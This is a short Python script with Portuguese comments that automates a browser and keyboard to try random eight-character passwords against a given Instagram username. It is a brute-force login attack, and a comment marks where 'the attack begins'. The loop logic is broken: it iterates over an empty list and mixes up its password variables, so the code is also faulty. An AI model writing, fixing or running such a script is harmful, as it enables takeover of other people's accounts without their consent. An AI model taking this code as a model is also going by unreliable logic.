from webbot import Browser
from pynput.keyboard import Key, Controller
import time
from random import choice
import string

user = input('Username: ')

## Variáveis de controle
web = Browser()
keyboard = Controller()

values = string.ascii_letters + string.digits ## letras e números
size = 8            ### quantidade de caracteres que desejar na criação da senha


web.go_to('www.instagram.com')
                        ### aqui começa o ataque
time.sleep(5)
keyboard.press(Key.enter)
keyboard.release(Key.enter)
time.sleep(5)
keyboard.press(Key.tab)
keyboard.release(Key.tab)
time.sleep(5)
web.type(user)
keyboard.press(Key.tab)
keyboard.release(Key.tab)

senha = []

for brute in senha:
    for i in range(size):       ### o primeiro loop, cria uma senha do tamanho em que for definida a variável "size"
        senha += choice(values)
    web.type(brute, into="Password")
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)
    print ("Trying sign in:",senha)
    time.sleep(5)

